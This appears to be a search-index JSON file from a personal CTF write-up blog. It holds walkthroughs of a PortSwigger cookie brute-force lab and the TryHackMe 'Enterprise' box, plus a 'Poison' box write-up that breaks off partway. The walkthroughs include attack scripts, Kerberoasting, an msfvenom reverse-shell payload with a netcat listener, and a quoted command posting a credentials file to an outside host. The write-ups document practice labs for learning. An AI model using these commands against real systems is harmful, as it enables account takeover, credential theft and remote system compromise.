
{
    
    
    
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2024-09-23","image":"","imageAlt":"","link":"http://localhost:1313/posts/cookie_brute/","summary":"\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003eThe \u0026ldquo;Brute-forcing a stay-logged-in cookie\u0026rdquo; lab by PortSwigger features a web application whose stay-logged-in cookies are vulnerable to attack.\u003c/p\u003e","tags":["Broken Authentication","Cookies","PortSwigger","Web Security"],"text":"description the \u0026ldquo;brute-forcing a stay-logged-in cookie\u0026rdquo; lab by portswigger features a web application whose stay-logged-in cookies are vulnerable to attack.\nwalkthrough navigate to the login page under \u0026ldquo;my account\u0026rdquo;. we will first create a stay-logged-in cookie with the user credentials given to us. make sure check \u0026ldquo;stay logged in\u0026rdquo;.\nnow we can copy the cookie to analyze. hit ctr-shift-i to open the developer tools panel and head to the \u0026ldquo;storage\u0026rdquo; section. the value for the \u0026ldquo;stay-logged-on\u0026rdquo; field is our cookie.\nthe cookie is encoded in base64. decoding it reveals that it is composed of the our username, \u0026ldquo;:\u0026rdquo;, and a hash.\n┌──(kali㉿kali)-[/tmp] └─$ echo \u0026#39;d2llbmvyojuxzgmzmgrkyzq3m2q0m2e2mdexztllymjhnmnhnzcw\u0026#39; | base64 -d wiener:51dc30ddc473d43a6011e9ebba6ca770 given that our username was used as part of the cookie, we can reasonably infer that the hash is based on a predictable value like a timestamp, password, or maybe even the username again. in this case, it\u0026rsquo;s the md5 hash of our password. we can confirm this by hashing our password using md5 and verifying it is identical to the hash in our cookie.\n┌──(kali㉿kali)-[/tmp] └─$ echo -n \u0026#39;peter\u0026#39; | md5sum | cut -d \u0026#39; \u0026#39; -f1 51dc30ddc473d43a6011e9ebba6ca770 we have now determined that the stay-logged-in cookie is username:\u0026lt;password md5 hash\u0026gt; and base64-encoded. since we have already been given a list of passwords, we can create a list of potential cookies for carlos by applying these rules. i provided a script that does this and saves the cookies into cookies.txt.\n#!/bin/bash # md5 hash -\u0026gt; user:\u0026lt;hash\u0026gt; -\u0026gt; base64 cookie while read -r line do hash=$(printf \u0026#34;$line\u0026#34; | md5sum | cut -d \u0026#39; \u0026#39; -f1) cookie=$(printf \u0026#34;carlos:$hash\u0026#34; | base64) echo \u0026#34;$cookie\u0026#34; \u0026gt;\u0026gt; cookies.txt done \u0026lt;\u0026lt;\u0026lt; $(cat pass.txt) now we can brute force the stay-logged-in cookie for carlos. logout and start burp suite. we are going to login again as wiener again, but this time we are going to intercept our web requests. forward the post request but capture the get request for your account details.\ncopy it and save it into a file. change the id query string\u0026rsquo;s value to carlos and replace the stay-logged-in cookie with fuzz. now, we can brute force the cookie.\nffuf -request request.txt -request-proto https -mode clusterbomb -w cookies.txt:fuzz -r we see a change in the webserver\u0026rsquo;s response after supplying one of the cookies.\nnow we can simply use our cookie to take over carlos. once again, we open the developer tools and head to storage \u0026gt; cookies. right click and add another item with the name as \u0026ldquo;stay-logged-in\u0026rdquo; and the value as the cookie we got.\nrefresh the page and we are now logged in as carlos.\nbeyond pwn note that finding the cookie for carlos is similar to a password dictionary attack. in this particular though, there is a ip ban for incorrect login attempts. by brute forcing the cookie instead of password, we are able to bypass the ip ban.\nalso worth mentioning is that we can also get the carlos user\u0026rsquo;s password while brute forcing his cookie.\n#!/bin/bash # md5 hash -\u0026gt; user:\u0026lt;hash\u0026gt; -\u0026gt; base64 cookie \u0026amp;\u0026amp; cookie-password map while read -r line do hash=$(printf \u0026#34;$line\u0026#34; | md5sum | cut -d \u0026#39; \u0026#39; -f1) cookie=$(printf \u0026#34;carlos:$hash\u0026#34; | base64) echo \u0026#34;$cookie\u0026#34; \u0026gt;\u0026gt; cookies.txt echo \u0026#34;$cookie: $line\u0026#34; \u0026gt;\u0026gt; map.txt done \u0026lt;\u0026lt;\u0026lt; $(cat pass.txt) once we successfully authenticate with a cookie, we can find its corresponding password through the map.\n┌──(kali㉿kali)-[/tmp] └─$ grep \u0026#39;y2fybg9zomvmnmu2nwvmyze4ogu3zgzmzdczmzvinjq2ytg1ytix\u0026#39; map.txt y2fybg9zomvmnmu2nwvmyze4ogu3zgzmzdczmzvinjq2ytg1ytix: thomas this can be useful when checking for password reuse and may help us access more services in a real engagement.\n","title":"Portswigger Lab: Brute-forcing a stay-logged-in cookie"},{"date":"2024-09-21","image":"","imageAlt":"","link":"http://localhost:1313/about/","summary":"\u003cp\u003eHello and welcome to my blog! Here you will my writeups for some of the CTFs I\u0026rsquo;ve done. I\u0026rsquo;ve started with a few interesting challenges I\u0026rsquo;ve done in the past, but as time goes on, I\u0026rsquo;ll populate this site with writeups for newer CTFs as well.\u003c/p\u003e","tags":[],"text":"hello and welcome to my blog! here you will my writeups for some of the ctfs i\u0026rsquo;ve done. i\u0026rsquo;ve started with a few interesting challenges i\u0026rsquo;ve done in the past, but as time goes on, i\u0026rsquo;ll populate this site with writeups for newer ctfs as well.\nwhoami a bit about myself\u0026hellip; i\u0026rsquo;m a compsci undergrad trying to learn how to properly secure his stuff. i\u0026rsquo;m also oscp-certified and like to spend my free time learning more about security through ctfs, mostly tryhackme and hackthebox in the past, but also expanding onto other platforms like portswigger and pwned labs. if anybody has other recommendations, questions, or would like to connect, here is my linkedin. you can also find some of my projects on github.\n","title":"About"},{"date":"2024-09-17","image":"","imageAlt":"","link":"http://localhost:1313/posts/enterprise/","summary":"\u003cp\u003e\u003cimg src=\"/img/enterprise/enterprise.png#center\" alt=\"Enterprise\"\u003e\u003c/p\u003e\n\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://tryhackme.com/r/room/enterprise\"\u003eEnterprise\u003c/a\u003e is a Hard difficulty Active Directory box on Tryhackme. We are in an assumed compromise scenario where our only target is a domain controller on the internal network. While privilege escalation was straightforward, there are multiple rabbit holes for initial access.\u003c/p\u003e","tags":["Active Directory","Git","Kerberoast","THM","Unqoted Service Path","Windows"],"text":"\ndescription enterprise is a hard difficulty active directory box on tryhackme. we are in an assumed compromise scenario where our only target is a domain controller on the internal network. while privilege escalation was straightforward, there are multiple rabbit holes for initial access.\nrecon i began my recon on the machine was a nmap scan.\n# nmap 7.94svn scan initiated wed sep 18 17:50:36 2024 as: nmap -p- -a -v -on nmap.scan -t5 10.10.62.141 increasing send delay for 10.10.62.141 from 0 to 5 due to 948 out of 2369 dropped probes since last increase. warning: 10.10.62.141 giving up on port because retransmission cap hit (2). nmap scan report for 10.10.62.141 host is up (0.21s latency). not shown: 65506 closed tcp ports (reset) port state service version 53/tcp open domain simple dns plus 80/tcp open http microsoft iis httpd 10.0 |_http-title: site doesn\u0026#39;t have a title (text/html). |_http-server-header: microsoft-iis/10.0 | http-methods: | supported methods: options trace get head post |_ potentially risky methods: trace 88/tcp open kerberos-sec microsoft windows kerberos (server time: 2024-09-18 18:02:39z) 135/tcp open msrpc microsoft windows rpc 139/tcp open netbios-ssn microsoft windows netbios-ssn 389/tcp open ldap microsoft windows active directory ldap (domain: enterprise.thm0., site: default-first-site-name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http microsoft windows rpc over http 1.0 636/tcp open tcpwrapped 3268/tcp open ldap microsoft windows active directory ldap (domain: enterprise.thm0., site: default-first-site-name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server microsoft terminal services | ssl-cert: subject: commonname=lab-dc.lab.enterprise.thm | issuer: commonname=lab-dc.lab.enterprise.thm | public key type: rsa | public key bits: 2048 | signature algorithm: sha256withrsaencryption | not valid before: 2024-09-17t17:46:46 | not valid after: 2025-03-19t17:46:46 | md5: 12f5:c3db:b128:72f4:9f89:6a26:be7a:899d |_sha-1: 2022:9e18:d0fb:90a4:ba39:9c9b:ef3c:504f:d485:d8ce | rdp-ntlm-info: | target_name: lab-enterprise | netbios_domain_name: lab-enterprise | netbios_computer_name: lab-dc | dns_domain_name: lab.enterprise.thm | dns_computer_name: lab-dc.lab.enterprise.thm | dns_tree_name: enterprise.thm | product_version: 10.0.17763 |_ system_time: 2024-09-18t18:03:41+00:00 |_ssl-date: 2024-09-18t18:03:49+00:00; +50s from scanner time. 5357/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) |_http-title: service unavailable |_http-server-header: microsoft-httpapi/2.0 5985/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) |_http-title: not found |_http-server-header: microsoft-httpapi/2.0 7990/tcp open http microsoft iis httpd 10.0 |_http-title: log in to continue - log in with atlassian account |_http-server-header: microsoft-iis/10.0 | http-methods: | supported methods: options trace get head post |_ potentially risky methods: trace 9389/tcp open mc-nmf .net message framing 47001/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) |_http-server-header: microsoft-httpapi/2.0 |_http-title: not found 49664/tcp open msrpc microsoft windows rpc 49665/tcp open msrpc microsoft windows rpc 49666/tcp open msrpc microsoft windows rpc 49668/tcp open ncacn_http microsoft windows rpc over http 1.0 49669/tcp open msrpc microsoft windows rpc 49670/tcp open msrpc microsoft windows rpc 49672/tcp open msrpc microsoft windows rpc 49674/tcp open msrpc microsoft windows rpc 49703/tcp open msrpc microsoft windows rpc 49707/tcp open msrpc microsoft windows rpc 49840/tcp open msrpc microsoft windows rpc aggressive os guesses: microsoft windows server 2019 (96%), microsoft windows 10 1709 - 1909 (93%), microsoft windows server 2012 (93%), microsoft windows server 2016 (92%), microsoft windows vista sp1 (92%), microsoft windows longhorn (92%), microsoft windows 10 1709 - 1803 (91%), microsoft windows 10 1809 - 2004 (91%), microsoft windows server 2012 r2 (90%), microsoft windows server 2012 r2 update 1 (90%) no exact os matches for host (test conditions non-ideal). network distance: 4 hops tcp sequence prediction: difficulty=260 (good luck!) ip id sequence generation: busy server or unknown class service info: host: lab-dc; os: windows; cpe: cpe:/o:microsoft:windows host script results: | smb2-security-mode: | 3:1:1: |_ message signing enabled and required |_clock-skew: mean: 49s, deviation: 0s, median: 49s | smb2-time: | date: 2024-09-18t18:03:42 |_ start_date: n/a traceroute (using port 554/tcp) hop rtt address 1 75.99 ms 10.13.0.1 2 ... 3 4 204.26 ms 10.10.62.141 read data files from: /usr/bin/../share/nmap os and service detection performed. please report any incorrect results at https://nmap.org/submit/ . # nmap done at wed sep 18 18:03:05 2024 -- 1 ip address (1 host up) scanned in 749.00 seconds even if we were not told that our target was a domain controller (per the room description), it would quickly become apparent with the discovery of dc-specific ports and services like kerberos on port 88.\nafter identifying open services, i always look for quick wins next. i noticed smb anonymous access was allowed and we have read permission on several shares.\n┌──(kali㉿kali)-[~] └─$ netexec smb 10.10.62.141 -u \u0026#39;anonymous\u0026#39; -p \u0026#39;\u0026#39; --shares smb 10.10.62.141 445 lab-dc [*] windows 10 / server 2019 build 17763 x64 (name:lab-dc) (domain:lab.enterprise.thm) (signing:true) (smbv1:false) smb 10.10.62.141 445 lab-dc [+] lab.enterprise.thm\\anonymous: smb 10.10.62.141 445 lab-dc [*] enumerated shares smb 10.10.62.141 445 lab-dc share permissions remark smb 10.10.62.141 445 lab-dc ----- ----------- ------ smb 10.10.62.141 445 lab-dc admin$ remote admin smb 10.10.62.141 445 lab-dc c$ default share smb 10.10.62.141 445 lab-dc docs read smb 10.10.62.141 445 lab-dc ipc$ read remote ipc smb 10.10.62.141 445 lab-dc netlogon logon server share smb 10.10.62.141 445 lab-dc sysvol logon server share smb 10.10.62.141 445 lab-dc users read users share. do not touch! docs and users in particular appeared worth digging further into. i took a look at docs first.\n┌──(kali㉿kali)-[/tmp] └─$ smbclient //10.10.62.141/docs -u anonymous -n try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . d 0 mon mar 15 02:47:35 2021 .. d 0 mon mar 15 02:47:35 2021 rsa-secured-credentials.xlsx a 15360 mon mar 15 02:46:54 2021 rsa-secured-document-pii.docx a 18432 mon mar 15 02:45:24 2021 15587583 blocks of size 4096. 9927627 blocks available smb: \\\u0026gt; there are two files, rsa-secured-credentials.xlsx and rsa-secured-document-pii.docx. these could be huge findings that allow us to breach the domain controller. i transferred the files to my attacker machine. the files were password protected, so i extracted the password hashes with office2john and started cracking them while i continued enumerating the machine (spoiler alert: i couldn\u0026rsquo;t crack any of the hashes).\ni took a look at the users share next. after some digging, i came across a powershell history file for lab_admin in \\lab-admin\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline\\.\nsmb: \\lab-admin\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline\\\u0026gt; get consolehost_hisory.txt getting file \\lab-admin\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline\\consolehost_hisory.txt of size 424 as consolehost_hisory.txt (0.4 kilobytes/sec) (average 0.4 kilobytes/sec) ┌──(kali㉿kali)-[/tmp] └─$ cat consolehost_hisory.txt cd c:\\ mkdir monkey cd monkey cd .. cd .. cd .. cd d: cd d: cd d: d:\\ mkdir temp cd temp echo \u0026#34;replication:101repadmin123!!\u0026#34;\u0026gt;private.txt invoke-webrequest -uri http://1.215.10.99/payment-details.txt more payment-details.txt curl -x post -h \u0026#39;cotent-type: ascii/text\u0026#39; -d .\\private.txt\u0026#39; http://1.215.10.99/dropper.php?file=itsdone.txt del private.txt del payment-details.txt cd .. del temp cd c:\\ c:\\ exit we see the credentials replication:101repadmin123!!. i tried using the credentials. unfortunately, it appears that the replication user has been deleted.\nwe can also brute force usernames by taking advantage of the kdc\u0026rsquo;s prompt for preauthentication for valid usernames (it returns an error if given a nonexistent username). i used kerbrute.\n┌──(kali㉿kali)-[~] └─$ ~/opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.62.141 --domain lab.enterprise.thm /usr/share/seclists/usernames/xato-net-10-million-usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ version: dev (9cfb81e) - 09/18/24 - ronnie flathers @ropnop 2024/09/18 17:47:42 \u0026gt; using kdc(s): 2024/09/18 17:47:42 \u0026gt; 10.10.62.141:88 2024/09/18 17:47:47 \u0026gt; [+] valid username: banana@lab.enterprise.thm 2024/09/18 17:47:54 \u0026gt; [+] valid username: guest@lab.enterprise.thm 2024/09/18 17:48:20 \u0026gt; [+] valid username: administrator@lab.enterprise.thm 2024/09/18 17:49:53 \u0026gt; [+] valid username: cake@lab.enterprise.thm 2024/09/18 17:50:51 \u0026gt; [+] valid username: enterprise@lab.enterprise.thm 2024/09/18 17:51:40 \u0026gt; [+] valid username: nik@lab.enterprise.thm 2024/09/18 17:52:34 \u0026gt; [+] valid username: guest@lab.enterprise.thm 2024/09/18 17:52:35 \u0026gt; [+] valid username: administrator@lab.enterprise.thm 2024/09/18 17:57:00 \u0026gt; [+] valid username: banana@lab.enterprise.thm 2024/09/18 17:57:14 \u0026gt; [+] valid username: spooks@lab.enterprise.thm 2024/09/18 17:59:28 \u0026gt; [+] valid username: joiner@lab.enterprise.thm i then tried sprayed 101repadmin123!! against the usernames and variations of it (e.g. 101repadmin123!) against the users to no avail. asreproasting also turned up nothing, so i had to look at other attack vectors.\nthere are also two http services running on ports 80 and 7990 that we can take a look at. while port 80 did not yield anything interesting, there is an atlassian portal on port 7990. the login portal itself appears to be a static and unexploitable webpage, but there is a message mentioning that the org may be moving to github.\ni have to admit, it took me way longer than i would have liked to figure out that there was an actual github page associated with \u0026ldquo;enterprise-thm\u0026rdquo; as opposed to something like a .git folder hidden in a subdirectory.\nthe github page has a single repository that doesn\u0026rsquo;t hold any useful information. however, there is an associated account \u0026ldquo;nik-enterprise-dev\u0026rdquo; which has a repository \u0026ldquo;mgmtscript.ps1\u0026rdquo;. this could prove to be out lucky break.\nfoothold the powershell script takes in a username and password and gets the system information of all computers within an active directory network. while the $username and $userpassword fields are empty, we can see that there has been more than one change pushed to this repository.\nwe can look at the details by cloning the repository.\ngit clone https://github.com/nik-enterprise-dev/mgmtscript.ps1.git i then switched to the repository folder and ran git log. this shows, among others, the commit hash for each push to the repository. we can use these hashes to view changes and previous versions of the repo.\n┌──(kali㉿kali)-[/tmp/mgmtscript.ps1] └─$ git log commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (head -\u0026gt; main, origin/main, origin/head) author: nik-enterprise-dev \u0026lt;80557956+nik-enterprise-dev@users.noreply.github.com\u0026gt; date: sat mar 13 20:09:16 2021 -0500 updated things i accidentally added something commit bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8 author: nik-enterprise-dev \u0026lt;80557956+nik-enterprise-dev@users.noreply.github.com\u0026gt; date: sat mar 13 18:57:40 2021 -0500 create systeminfo.ps1 gets system info from each computer on the domain in one of his commits, nik comments that he \u0026ldquo;accidentally added something\u0026rdquo;. we can view the details by supplying the commit hash.\n┌──(kali㉿kali)-[/tmp/mgmtscript.ps1] └─$ git show c3c239df75fefbe7563d1d29c963ba1f01e4fe5a commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (head -\u0026gt; main, origin/main, origin/head) author: nik-enterprise-dev \u0026lt;80557956+nik-enterprise-dev@users.noreply.github.com\u0026gt; date: sat mar 13 20:09:16 2021 -0500 updated things i accidentally added something diff --git a/systeminfo.ps1 b/systeminfo.ps1 index bc7ca27..5ae7576 100644 --- a/systeminfo.ps1 +++ b/systeminfo.ps1 @@ -1,6 +1,6 @@ import-module activedirectory -$username = \u0026#39;nik\u0026#39; -$userpassword = \u0026#39;\u0026lt;nik\u0026#39;s password\u0026gt;\u0026#39; +$username = \u0026#39;\u0026#39; +$userpassword = \u0026#39;\u0026#39; $pscreds = convertto-securestring $userpassword -asplaintext -force $computers = new-object -typename \u0026#34;system.collections.arraylist\u0026#34; $computer = $(get-adcomputer -filter * | select-object name) we see that nik had accidentally pushed his credentials and the final commit removed them from the repository. i tried nik:\u0026lt;nik's password\u0026gt; against a number of services, but the account does not have sufficient privileges to gain a foothold through common services like rdp or smb. however, since it is a domain account, we can also perform other attacks such as kerberoasting.\n┌──(kali㉿kali)-[/tmp] └─$ impacket-getuserspns lab.enterprise.thm/nik:\u0026#39;\u0026lt;nik\u0026#39;s password\u0026gt;\u0026#39; -dc-ip 10.10.62.141 -request -outputfile kerberoast.txt impacket v0.12.0.dev1 - copyright 2023 fortra serviceprincipalname name memberof passwordlastset lastlogon delegation -------------------- --------- ----------------------------------------------------------- -------------------------- -------------------------- ---------- http/lab-dc bitbucket cn=sensitive-account,cn=builtin,dc=lab,dc=enterprise,dc=thm 2021-03-12 01:20:01.333272 2021-04-26 15:16:41.570158 [-] ccache file is not found. skipping... we get a hash for bitbucket. now to crack it\u0026hellip;\nhashcat -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt eventually, it cracks.\nprivilege escalation with the new credentials for the bitbucket service account, i connected to the domain controller through rdp.\nxfreerdp /v:10.10.62.141 /u:bitbucket /p:\u0026lt;bitbucket\u0026#39;s password\u0026gt; /cert-ignore after some enumeration, i found an unquoted service path.\nc:\\users\\bitbucket\u0026gt;wmic service get name,pathname | findstr /i /v \u0026#34;c:\\windows\\\\\u0026#34; | findstr /i /v \u0026#34;\u0026#34;\u0026#34; name pathname atlassianbitbucket c:\\atlassian\\bitbucket\\7.11.1\\bin\\bserv64.exe //rs//atlassianbitbucket atlassianbitbucketelasticsearch c:\\atlassian\\bitbucket\\7.11.1\\elasticsearch\\bin\\elasticsearch-service-x64.exe //rs//atlassianbitbucketelasticsearch lsm netsetupsvc zerotieroneservice c:\\program files (x86)\\zero tier\\zero tier one\\zerotier one.exe unquoted service paths are a vulnerability that arises due to the way windows runs its binaries. say we have a program c:\\users\\public\\my programs\\new program.exe, windows will first try to execute c:\\users\\public\\my.exe followed by c:\\users\\public\\my program.exe, c:\\users\\public\\my program\\new.exe, and finally c:\\users\\public\\my programs\\new program.exe because of the spaces in and the path and lack of enclosing quotes. zerotieroneservice is vulnerable to this type of exploit.\nimportantly, the service binary is owned by nt authority\\system.\nc:\\users\\bitbucket\u0026gt;dir /q \u0026#34;c:\\program files (x86)\\zero tier\\zero tier one\\zerotier one.exe\u0026#34; volume in drive c has no label. volume serial number is 7cd9-a0ae directory of c:\\program files (x86)\\zero tier\\zero tier one 12/05/2014 11:52 am 9,594,056 nt authority\\system zerotier one.exe 1 file(s) 9,594,056 bytes 0 dir(s) 40,566,411,264 bytes free user permissions for c:\\program files (x86)\\zero tier:\nc:\\users\\bitbucket\u0026gt;icacls \u0026#34;c:\\program files (x86)\\zero tier\u0026#34; c:\\program files (x86)\\zero tier builtin\\users:(oi)(ci)(w) nt service\\trustedinstaller:(i)(f) nt service\\trustedinstaller:(i)(ci)(io)(f) nt authority\\system:(i)(f) nt authority\\system:(i)(oi)(ci)(io)(f) builtin\\administrators:(i)(f) builtin\\administrators:(i)(oi)(ci)(io)(f) builtin\\users:(i)(rx) builtin\\users:(i)(oi)(ci)(io)(gr,ge) creator owner:(i)(oi)(ci)(io)(f) application package authority\\all application packages:(i)(rx) application package authority\\all application packages:(i)(oi)(ci)(io)(gr,ge) application package authority\\all restricted application packages:(i)(rx) application package authority\\all restricted application packages:(i)(oi)(ci)(io)(gr,ge) successfully processed 1 files; failed processing 0 files bitbucket, as a member of builtin\\users, has write access to the c:\\program files (x86)\\zero tier directory through builtin\\users. it is therefore possible to write a \u0026ldquo;zero.exe\u0026rdquo; binary have the zerotieroneservice execute it.\nmsfvenom -p windows/x64/shell_reverse_tcp lhost=10.13.48.55 lport=31337 -f exe -o zero.exe now to transfer it to our target\u0026hellip;\npython3 -m http.server 80 c:\\program files (x86)\\zero tier\u0026gt;certutil -urlcache -f http://10.13.48.55/zero.exe zero.exe next, i checked the status of zerotieroneservice.\nc:\\program files (x86)\\zero tier\u0026gt;sc query zerotieroneservice service_name: zerotieroneservice type : 10 win32_own_process state : 1 stopped win32_exit_code : 0 (0x0) service_exit_code : 0 (0x0) checkpoint : 0x0 wait_hint : 0x7d0 the service is not running. all that needs to be done now is to start the service and we should receive a shell as nt authority\\system (don\u0026rsquo;t forget to start a listener first).\nc:\\users\\bitbucket\u0026gt;sc start zerotieroneservice ┌──(kali㉿kali)-[~] └─$ rlwrap nc -nvlp 31337 listening on [any] 31337 ... connect to [10.13.48.55] from (unknown) [10.10.146.30] 49930 microsoft windows [version 10.0.17763.1817] (c) 2018 microsoft corporation. all rights reserved. c:\\windows\\system32\u0026gt;whoami whoami nt authority\\system c:\\windows\\system32\u0026gt; ","title":"Enterprise"},{"date":"2024-09-16","image":"","imageAlt":"","link":"http://localhost:1313/posts/poison/","summary":"\u003cp\u003e\u003cimg src=\"/img/poison/poison.png#center\" alt=\"Poison\"\u003e\u003c/p\u003e\n\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003ePoison is a Medium difficulty FreeBSD box. Exploitation involves gaining a low-privilege shell through a vulnerable webapp and escalating privileges through improperly secured credentials.\u003c/p\u003e","tags":["FreeBSD","HTB","LFI","Port Forwarding","Unix","VNC"],"text":"\ndescription poison is a medium difficulty freebsd box. exploitation involves gaining a low-privilege shell through a vulnerable webapp and escalating privileges through improperly secured credentials.\nrecon we start by running a nmap scan against the target.\n┌──(kali㉿kali)-[~] └─$ sudo nmap -p- -a 10.10.10.84 -t5 starting nmap 7.94svn ( https://nmap.org ) at 2024-09-17 01:19 gmt warning: 10.10.10.84 giving up on port because retransmission cap hit (2). nmap scan report for 10.10.10.84 host is up (0.041s latency). not shown: 45954 filtered tcp ports (no-response), 19579 closed tcp ports (reset) port state service version 22/tcp open ssh openssh 7.2 (freebsd 20161230; protocol 2.0) | ssh-hostkey: | 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (rsa) | 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ecdsa) |_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ed25519) 80/tcp open http apache httpd 2.4.29 ((freebsd) php/5.6.32) |_http-title: site doesn\u0026#39;t have a title (text/html; charset=utf-8). |_http-server-header: apache/2.4.29 (freebsd) php/5.6.32 aggressive os guesses: freebsd 11.0-release - 12.0-current (97%), freebsd 11.1-stable (97%), freebsd 11.2-release - 11.3 release or 11.2-stable (96%), freebsd 11.3-release (96%), freebsd 11.0-stable (95%), freebsd 11.1-release or 11.2-stable (95%), freebsd 11.1-release (95%), freebsd 11.0-current (94%), freebsd 11.0-release (94%), freebsd 12.0-release - 13.0-current (93%) no exact os matches for host (test conditions non-ideal). network distance: 2 hops service info: os: freebsd; cpe: cpe:/o:freebsd:freebsd traceroute (using port 3306/tcp) hop rtt address 1 40.51 ms 10.10.14.1 2 40.65 ms 10.10.10.84 os and service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 120.47 seconds the scan shows that tcp ports 22 and 80 are open. visiting the webpage on port 80, we can see a website with the title \u0026ldquo;temporary website to test local .php scripts\u0026rdquo;.\nthere is a list of files that we can test. i tried listfiles.php. the output was messy, so i used view source to get a cleaner view.\nwe get a directory listing. it appears as if browse.php is executing php files that are passed to it. http wrappers are disabled unfortunately, so we can\u0026rsquo;t get a shell through rfi :(. we could also try other attack vectors like log poisoning (which does give you shell as www-data), but there is an interesting file \u0026ldquo;pwdbackup.txt\u0026rdquo; that we can check out first.\nsuccess! now all we need to do is decode the password. we will need to do this 13 times, as implied by the note from out unsuspecting target. this can be done by passing the password to base64 -d manually, but it\u0026rsquo;s far simpler to use a script. i\u0026rsquo;ve provided one below:\n#!/bin/bash encoded_pass=\u0026#34;vm0wd2qyuxlvwgxwv0d4wflurndvrlpzwkzoaljswjbuvlppv0zkc2jetlhhmk0xvmpks1iyskvubghotvvwvvztcedzv015u2twvqpir2hvvfzwd1zwwnrjrwrutwxksvztdgtxqxbpum5cufdwzdbsbvzhv25saljyulvuvluxu1zadgrgzfzam0jwvmxad1dwwnrnvfjqck1eqjrxa1prwvzkr1nsvlvwm040vgtaa2ntrkdar2hwv0vkvvdxegftmvzhwkzotlzgslrdazffuwpsv01qvlrzvezlyzjosvrswmkkv0donlzhegfzvk5ivwtsvwjxafdwmfzlvlzkwgvhrlrnbey0vji1u2exsxdxbuzeykzwelyyeg9xr0v4y0hkwfzscexvakzpzezkcwpar2dlwvrcwk1gwkhkr0zavms1r1rswmtzvkl5yuzkv01gwkxwbfprv0dwsfjsuk5wbkjzvmpkmgexwnrswhbwymtkrvlycedlvmxyclvstldnrez4vm10nfywmxvuak5hvm1ssfvqrldjd3bqujj0tfzxmdfrmkl4wkhoyvjgslhuv3hlujfsc1dtdfpwa2w1wvvat1ywmuckv2t4v2jgchjwmgrxu0dssgjfnwlsweeyvmpkmflxrxhxbljtv0hcv1ltczfsvmxzvm5kwfjsbdvdbvjit1zktljfwjrwbtewtkzkrwpxbk5qulhov1lxdgfvrmw2umxkamqzqlhza2rpvezkwgrhovjivlp6vji1u2fsslhvbgrvvmxwelrrwlplvtvwt1zwv2eydzfxvlzhcmexwxdnvwnlvjj0nfyyskdjr2hhulzwnfzswkdkr1jgtldotmjttjnwbxbltudjefvyaglsbvjwwvrkb1yxbhjwveztvm14elztehckvg1kr2neqkrivlpjvdfaa2fwwllra3byvmxadlperlpkd3bov0vavflrzg9hrlzzwkzowfjswnhvbxm1yw1relftafzivezqvkvaawpxr1zhv210tmjfwtbwakowvjfvevnrafzirnbwvmpou00xcfhlrmryujfasfdrwldhvkpzuw1gv2eyuxddazvhu2tkaljgbexwrlztcmmxskdjrfpoukd4rvdub3dpvu5uufqwswo=\u0026#34; for i in {1..13} do encoded_pass=$(echo -n \u0026#34;$encoded_pass\u0026#34; | base64 -d) done echo -n \u0026#34;$encoded_pass\u0026#34; after running the script, we get our password charix!2#4%6\u0026amp;8(0.\nfoothold we have a password, but we don\u0026rsquo;t know any users we could potentially authenticate as. recall that the webpage can read files. since we know that the target machine is likely freebsd, a unix-like os, we can try to read the /etc/passwd to find users.\nnotice there are three users: root, toor, and charix that seem interesting. we can spray our password against these accounts via ssh. it is true that charix!2#4%6\u0026amp;8(0 is likely the password for charix, it\u0026rsquo;s still worth checking the other accounts for password reuse.\nand now we can authenticate as charix to the server.\nprivilege escalation now that we have a shell, we can move onto privilege escalation. feel free to grab the user flag, but there is also a secret.zip file that might be interesting. it\u0026rsquo;s password protected though, and i find files easier to investigate when they are on my local machine. so i transferred the zip file to kali.\non kali:\n┌──(kali㉿kali)-[/tmp] └─$ nc -nvlp 8000 \u0026gt; secret.zip listening on [any] 8000 ... on poison:\ncharix@poison:~ % nc -nv 10.10.14.33 8000 \u0026lt; secret.zip connection to 10.10.14.33 8000 port [tcp/*] succeeded! before trying to crack the password, we can test for password reuse by supplying the password we got for charix . it succeeds and we get a secret file that appears to be random binary data. i couldn\u0026rsquo;t figure out its purpose at this point, so i decided to enumerate further. i noticed three tcp ports only accessible from localhost on poison: 25, 5801, and 5901.\ncharix@poison:~ % sockstat -4 user command pid fd proto local address foreign address www httpd 728 4 tcp4 *:80 *:* charix sshd 719 3 tcp4 10.10.10.84:22 10.10.14.33:57270 root sshd 716 3 tcp4 10.10.10.84:22 10.10.14.33:57270 www httpd 704 4 tcp4 *:80 *:* root sendmail 642 3 tcp4 127.0.0.1:25 *:* www httpd 641 4 tcp4 *:80 *:* www httpd 640 4 tcp4 *:80 *:* www httpd 639 4 tcp4 *:80 *:* www httpd 638 4 tcp4 *:80 *:* www httpd 637 4 tcp4 *:80 *:* root httpd 625 4 tcp4 *:80 *:* root sshd 620 4 tcp4 *:22 *:* root xvnc 529 1 tcp4 127.0.0.1:5901 *:* root xvnc 529 3 tcp4 127.0.0.1:5801 *:* root syslogd 390 7 udp4 *:514 